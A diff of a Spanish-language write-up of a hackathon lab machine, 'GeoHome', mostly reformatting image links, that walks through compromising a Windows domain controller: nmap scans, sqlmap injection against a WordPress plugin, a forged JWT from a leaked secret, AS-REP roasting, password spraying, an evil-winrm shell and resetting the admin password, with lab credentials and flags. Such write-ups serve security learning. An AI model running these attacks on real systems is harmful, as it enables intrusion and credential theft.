@@ -10,7 +10,8 @@ Guillermo Mejías Climent
 
 ## Reconocimiento de la máquina
 `sudo nmap -sn -PR 172.16.54.0/24`
-![[Pasted image 20220521102726.png]]
+![Image](Pasted%20image%2020220521102726.png?raw=true)
+
 
 >La IP de la máquina windows es la `172.16.54.182`
 
@@ -23,7 +24,7 @@ sudo nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,1337,3268,3269,3306,50
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
@@ -43,7 +44,7 @@ PORT      STATE SERVICE       VERSION
 | Not valid before: 2022-05-19T03:32:36
 |_Not valid after:  2023-05-18T00:00:00
 |_http-server-header: Microsoft-HTTPAPI/2.0
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 |_ssl-date: 2022-05-21T08:31:19+00:00; 0s from scanner time.
 445/tcp   open  microsoft-ds?
@@ -75,7 +76,7 @@ PORT      STATE SERVICE       VERSION
 | ssl-cert: Subject: commonName=MySQL_Server_8.0.29_Auto_Generated_Server_Certificate
 | Not valid before: 2022-05-19T03:28:01
 |_Not valid after:  2032-05-16T03:28:01
-| mysql-info: 
+| mysql-info:
 |   Protocol: 10
 |   Version: 8.0.29
 |   Thread ID: 39
@@ -85,8 +86,8 @@ PORT      STATE SERVICE       VERSION
 |   Salt: \x18a|-\x0CfI\x0Cy    yN7\x10-R\x047=l
 |_  Auth Plugin Name: caching_sha2_password
 5000/tcp  open  upnp?
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     HTTP/1.1 200 OK
 |     Server: Werkzeug/2.1.2 Python/3.7.0
 |     Date: Sat, 21 May 2022 08:29:46 GMT
@@ -94,7 +95,7 @@ PORT      STATE SERVICE       VERSION
 |     Content-Length: 50
 |     Connection: close
 |     {"text":"There is nothing to see here (I guess)"}
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 200 OK
 |     Server: Werkzeug/2.1.2 Python/3.7.0
 |     Date: Sat, 21 May 2022 08:30:01 GMT
@@ -102,7 +103,7 @@ PORT      STATE SERVICE       VERSION
 |     Allow: GET, HEAD, OPTIONS
 |     Content-Length: 0
 |     Connection: close
-|   Help: 
+|   Help:
 |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
 |     "http://www.w3.org/TR/html4/strict.dtd">
 |     <html>
@@ -117,7 +118,7 @@ PORT      STATE SERVICE       VERSION
 |     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
 |     </body>
 |     </html>
-|   RTSPRequest: 
+|   RTSPRequest:
 |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
 |     "http://www.w3.org/TR/html4/strict.dtd">
 |     <html>
@@ -137,14 +138,14 @@ PORT      STATE SERVICE       VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 9389/tcp  open  mc-nmf        .NET Message Framing
 33060/tcp open  mysqlx?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
 |     Invalid message"
 |     HY000
-|   LDAPBindReq: 
+|   LDAPBindReq:
 |     *Parse error unserializing protobuf message"
 |     HY000
-|   oracle-tns: 
+|   oracle-tns:
 |     Invalid message-frame."
 |_    HY000
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
@@ -231,10 +232,10 @@ MAC Address: 08:00:27:01:B6:5B (Oracle VirtualBox virtual NIC)
 Service Info: Host: GEOHOME-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2022-05-21T08:31:11
 |_  start_date: N/A
 |_nbstat: NetBIOS name: GEOHOME-DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:01:b6:5b (Oracle VirtualBox virtual NIC)
@@ -250,13 +251,13 @@ Vamos a comenzar un análisis exhaustivo de cada uno de los puertos y sus servic
 
 
 **53/tcp - Simple DNS Plus**
-![[Pasted image 20220521103335.png]]
+![Image](Pasted%20image%2020220521103335.png?raw=true)
 
 Vamos a intentar un ataque de transferencia de zona, para ello, modificando correctamente el fichero `/etc/hosts` vamos a analizar el servicio con el comando `dig`y con metasploit.
 ```
 dig @172.16.54.182 geohome.com axfr
 ```
-![[Pasted image 20220521105400.png]]
+![Image](Pasted%20image%2020220521105400.png?raw=true)
 
 Hasta aquí no hemos obtenido nada jugoso de este servicio.
 
@@ -270,12 +271,12 @@ Añadimos al fichero `/etc/hosts`
 
 **80/tcp - Microsoft IIS httpd 10.0 **
 
-![[Pasted image 20220521105854.png]]
+![Image](Pasted%20image%2020220521105854.png?raw=true)
 Vemos que no aplica virtual hostings, al menos aparentemente.
 
 Aplicamos un pequeño análisis por fuerza bruta de directorios y archivos con nmap:
 `nmap --script http-enum -p 80 172.16.54.182`
-![[Pasted image 20220521111111.png]]
+![Image](Pasted%20image%2020220521111111.png?raw=true)
 Ya conseguimos una ruta que además pareciera que aquí el virtual hosting es fundamental. Ya vemos que el flujo del análisis pasa por el puerto 443, saltamos de momento a este análisis.
 
 
@@ -285,11 +286,11 @@ Actualizamos el fichero `/etc/hosts` con la línea:
 ```text
 172.16.54.182   geohome.com wp.geohome.com GEOHOME-DC.geohome.com
 ```
-![[Pasted image 20220521112145.png]]
+![Image](Pasted%20image%2020220521112145.png?raw=true)
 Estamos frente a un wordpress.
 
 En este punto con la herramienta `whatweb`vamos a obtener más detalles sobre la web:
-![[Pasted image 20220521114213.png]]
+![Image](Pasted%20image%2020220521114213.png?raw=true)
 ```
 (base) ┌──(kali㉿kali)-[~]
 └─$ whatweb https://wp.geohome.com
@@ -299,9 +300,9 @@ https://wp.geohome.com [200 OK] Cookies[wp-ps-session], Country[RESERVED][ZZ], H
 
 ## FLAG 1 - FLAG{ALWAYS_CHECK_COMMITS}
 Analizando la interfaz vemos que hay un botón de github en el "footer" de la web:
-[https://github.com/geohome-dev/GeoAPI](https://github.com/geohome-dev/GeoAPI "https://github.com/geohome-dev/GeoAPI") Clonamos el repo (git clone) Revisamos los commits (git log) y obtenemos una flag: 
+[https://github.com/geohome-dev/GeoAPI](https://github.com/geohome-dev/GeoAPI "https://github.com/geohome-dev/GeoAPI") Clonamos el repo (git clone) Revisamos los commits (git log) y obtenemos una flag:
 >Flag: FLAG{ALWAYS_CHECK_COMMITS}
-![[Pasted image 20220521162203.png]]
+![Image](Pasted%20image%2020220521162203.png?raw=true)
 
 A parte de la flag investigando los commits hemos encontrado un secreto en una versión antigüa, una "JWT_SECRET_KEY" con el que podremos generar un token de autorización de una API que podamos encontrar.
 >app.config["JWT_SECRET_KEY"] = "Ge0HomeIsThePlaceWhereFantasyMeetsReality"
@@ -313,28 +314,28 @@ Vamos a comenzar a analizar por fuerza bruta con `gobuster`
 Y de aquí obtenemos varios directorios como:
 https://wp.geohome.com/hello-world/
 
-![[Pasted image 20220521114912.png]]
+![Image](Pasted%20image%2020220521114912.png?raw=true)
 Analizando el fichero del `rss` podemos encontrar información sobre los posts publicados y el usuario que lo ha hecho, con esto podemos enumerar usuarios con la propia interfaz de login de wordpress:
-![[Pasted image 20220521115217.png]]
-![[Pasted image 20220521115251.png]]
+![Image](Pasted%20image%2020220521115217.png?raw=true)
+![Image](Pasted%20image%2020220521115251.png?raw=true)
 Vemos que el usuario "geoadmin" existe en la base de datos de wordpress y podemos corroborarlo.
 
 En este punto el análisis por fuerza bruta de gobuster nos ha devuelto una directorio clave,
-![[Pasted image 20220521120134.png]]
-![[Pasted image 20220521120231.png]]
+![Image](Pasted%20image%2020220521120134.png?raw=true)
+![Image](Pasted%20image%2020220521120231.png?raw=true)
 
 
 ## FLAG 2 - FLAG{Update_Plugins!}
 Aquí vemos un potencial plugins de wordpress que hay que analizar.
  Vamos a analizar si con `searchsploit`encontramos algo:
- ![[Pasted image 20220521120542.png]]
+ ![Image](Pasted%20image%2020220521120542.png?raw=true)
  >WordPress Plugin Perfect Survey - 1.5.1 - SQLi (Unauthenticated)
 
 Vamos a ver si es posible explotar este vector:
 ```
 searchsploit -x php/webapps/50766.py
 ```
-![[Pasted image 20220521120925.png]]
+![Image](Pasted%20image%2020220521120925.png?raw=true)
 Vemos que hay un exploit creado el 18 de Febrero de este mismo año.
 En el exploit se utiliza `sqlmap` para extraer y sonsacar la información de la base de datos. Analizandolo y adaptándolo a nuestro caso he preferido ejecutar directamente `sqlmap` en lugar de el script.
 
@@ -346,9 +347,9 @@ sqlmap "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&quest
 
 Ahora vamos a intentar sacar los credenciales del usuario de wordpress dentro directamente de la base de datos:
 `sqlmap "[https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1](https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1 "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1") *" --columns -D wordpress -T wp_users --force-ssl --threads 10 --dump`
-![[Pasted image 20220521164143.png]]
+![Image](Pasted%20image%2020220521164143.png?raw=true)
 Esto nos devuelve un hash, el problema es que no hemos podido romper dicho hash con las _rainbow tables_ de las que disponemos.
-![[Pasted image 20220521165710.png]]
+![Image](Pasted%20image%2020220521165710.png?raw=true)
 
 Ahora lo que nos queda por probar es si podemos obtener los usuarios de la propia base de datos MySQL para logearnos directamente, ya que el sevicio está expuesto (cosa que no debería estar).
 
@@ -365,33 +366,33 @@ http://geohome.com:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.
 
 
 >Server: Werkzeug/2.1.2 Python/3.7.0
-![[Pasted image 20220521141828.png]]
+![Image](Pasted%20image%2020220521141828.png?raw=true)
 `searchsploit -x multiple/remote/43905.py`
 
 Analizando el script podemos comprobar si este servicio tiene la consola de debugeo activada con la url:
 `http://geohome.com:5000/console`
-Pero no es el caso. 
+Pero no es el caso.
 
 Por el momento este servicio queda descartado.
 
 Con esto vemos los directorios que puedan existir:
 `gobuster dir -u http://geohome.com:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
-![[Pasted image 20220521172645.png]]
+![Image](Pasted%20image%2020220521172645.png?raw=true)
 
 En esta aplicación vemos en primer lugar que su servidor se ejecuta bajo python, además que las rutas coinciden parcialmente con las rutas con las que la API encontrada en github son documentadas. Si entramos en la ruta "whoami"
-![[Pasted image 20220521175217.png]]
+![Image](Pasted%20image%2020220521175217.png?raw=true)
 
 Así que con el secreto que encontramos antes vamos a intentar crear un token JWT de autorización:
-![[Pasted image 20220521175345.png]]
-![[Pasted image 20220521175425.png]]
+![Image](Pasted%20image%2020220521175345.png?raw=true)
+![Image](Pasted%20image%2020220521175425.png?raw=true)
 
 Y con esto creamos una petición con dicho secreto:
-![[Pasted image 20220521175516.png]]
+![Image](Pasted%20image%2020220521175516.png?raw=true)
 Con esto estamos logueados como el usuario "123456789" pero no queremos eso, queremos ser admin, así pues nos vamos a la generación del token y cambiamos el usuario por "admin" y el token generado termina siendo:
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJKb2huIERvZSIsImlhdCI6MTUxNjIzOTAyMn0.M5bdLayt2SgbV_JsoRu5zc2TD5qy3Ie33JZrFcXyqLM
 ```
-![[Pasted image 20220521181314.png]]
+![Image](Pasted%20image%2020220521181314.png?raw=true)
 Y tenemos una nueva flag:
 >API_FLAG{Never_public_your_secret}
 
@@ -417,16 +418,16 @@ http://geohome.com:5985 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Micros
 base) ┌──(kali㉿kali)-[~/Desktop/Hackathon]
 └─$ crackmapexec smb 172.16.54.182 -u anonymous                                                
 SMB         172.16.54.182   445    GEOHOME-DC       [*] Windows 10.0 Build 17763 x64 (name:GEOHOME-DC) (domain:geohome.com) (signing:True) (SMBv1:False)
-                      
+
 ```
 
 Mirando el FB podemos obtener una lista de posibles usuarios para autenticarnos frente al servicio smb.
 
 
 ->AS-REP-ROASting attack
-![[Pasted image 20220521184453.png]]
+![Image](Pasted%20image%2020220521184453.png?raw=true)
 Rompemos el hash obtenido.
-![[Pasted image 20220521184725.png]]
+![Image](Pasted%20image%2020220521184725.png?raw=true)
 
 En este punto ya tenemos unos credenciales de usuario:
 >ffuertes:electrica@1984
@@ -434,7 +435,7 @@ En este punto ya tenemos unos credenciales de usuario:
 Enumeramos los accesos del usuario:
 `smbmap -H geohome.com -u ffuertes -p electrica@1984`
 `smbmap -H geohome.com -u ffuertes -p electrica@1984 -r`
-![[Pasted image 20220521185456.png]]
+![Image](Pasted%20image%2020220521185456.png?raw=true)
 
 
 
@@ -443,7 +444,7 @@ Usando rpcclient enumeramos usuarios:
 ```text
 (base) ┌──(kali㉿kali)-[~/Desktop/Hackathon]
 └─$ rpcclient -U "ffuertes" geohome.com                                                                                                                                                                                                                                               1 ⨯
-Enter WORKGROUP\ffuertes's password: 
+Enter WORKGROUP\ffuertes's password:
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
 user:[Guest] rid:[0x1f5]
@@ -467,10 +468,10 @@ Estos usuarios nuevos no son vulnerables a un ataque AS-REP-ROASting. Así que c
 
 Listamos propiedades de los usuarios.
 ```
-rpcclient -U "ffuertes" geohome.com 
+rpcclient -U "ffuertes" geohome.com
 queryuser nybanez
 ```
-![[Pasted image 20220521191929.png]]
+![Image](Pasted%20image%2020220521191929.png?raw=true)
 Ahí tenemos lo que parece una contraseña que deberemos probar con cada uno de los usuarios:
 >The3rdQinDinastyThermOs?
 `crackmapexec smb geohome.com -u users_rpc -p "The3rdQinDinastyThermOs?"`
@@ -492,9 +493,9 @@ Y analizando los accesos con los que este usuario cuenta:
         HR-SHARE                                                READ ONLY
         IPC$                                                    READ ONLY       Remote IPC
         IT-SHARE                                                NO ACCESS
-        NETLOGON                                                READ ONLY       Logon server share 
+        NETLOGON                                                READ ONLY       Logon server share
         Research-SHARE                                          NO ACCESS
-        SYSVOL                                                  READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share
 
 ```
 Con este usuario podemos entrar en `HR-SHARE/BACKUP/DELETEME`
@@ -509,7 +510,7 @@ Por defecto todos los usuarios se crean con una contrase�a predeterminada: g3o
 
 Volvemos a probar con crackmapexec a ver a quién pertenece esta contraseña:
 `crackmapexec smb geohome.com -u users_rpc -p "g3oh0m3\!us4ar\!0"`
-![[Pasted image 20220521194750.png]]
+![Image](Pasted%20image%2020220521194750.png?raw=true)
 >enriques:g3oh0m3!us4ar!0
 
 g3oh0m3!us4ar!0"
@@ -517,14 +518,14 @@ g3oh0m3!us4ar!0"
 Con este nuevo usuario intentamos logearnos con `evil-winrm`
 `evil-winrm -i geohome.com -u jenriques -p g3oh0m3\!us4ar\!0`
 Y voilá, tenemos una sesión en Powershell:
-![[Pasted image 20220521200332.png]]
+![Image](Pasted%20image%2020220521200332.png?raw=true)
 
 Y accediendo a su carpeta Desktop obtenemos la siguiente flag.
 >FLAG{Buen_Password_Spraying_Eh?}
 
 ## FLAG 5 - FLAG{SSRF_PARA_TOD@S_XD}
 Revisando en el directorio `C:\inetpub\`hemos encontrado revisando algunos ficheros la siguiente flag, creo que no era el método esperado para dar con ella:
-![[Pasted image 20220521213015.png]]
+![Image](Pasted%20image%2020220521213015.png?raw=true)
 
 
 
@@ -534,9 +535,9 @@ Investigando con la sesión de PS encontramos los directorios donde residen las 
 >C:\inetpub\GeoHome
 
 Y encontramos en el wp-config.php:
-![[Pasted image 20220521203752.png]]
+![Image](Pasted%20image%2020220521203752.png?raw=true)
 Estas credenciales no son del wordpress sino de la base de datos MySQL:
-![[Pasted image 20220521204005.png]]
+![Image](Pasted%20image%2020220521204005.png?raw=true)
 >Nueva contraseña: R34lm3nteEstaNoS!rveDeN@d@
 
 Esta password tan sólo sirve para entrar en la base de datos.
@@ -545,7 +546,7 @@ Cambiamos la contraseña del wordpress por "prueba"
 ```
 UPDATE `wp_users` SET `user_pass` = '$P$Bpmq0M2/IZ7EDbrCEue6JwtYuFALfd1' WHERE user_login = "geoadmin";
 ```
-![[Pasted image 20220521211223.png]]
+![Image](Pasted%20image%2020220521211223.png?raw=true)
 
 
 Y hasta aquí hemos llegado por hoy.
@@ -557,7 +558,7 @@ FLAG{ALWAYS_CHECK_COMMITS}
 
 #Wordpress
 FLAG{Update_Plugins!}
-	
+
 #API
 API_FLAG{Never_public_your_secret}
 
@@ -567,4 +568,3 @@ FLAG{Buen_Password_Spraying_Eh?}
 #SSRF
 FLAG{SSRF_PARA_TOD@S_XD}
 ```
-
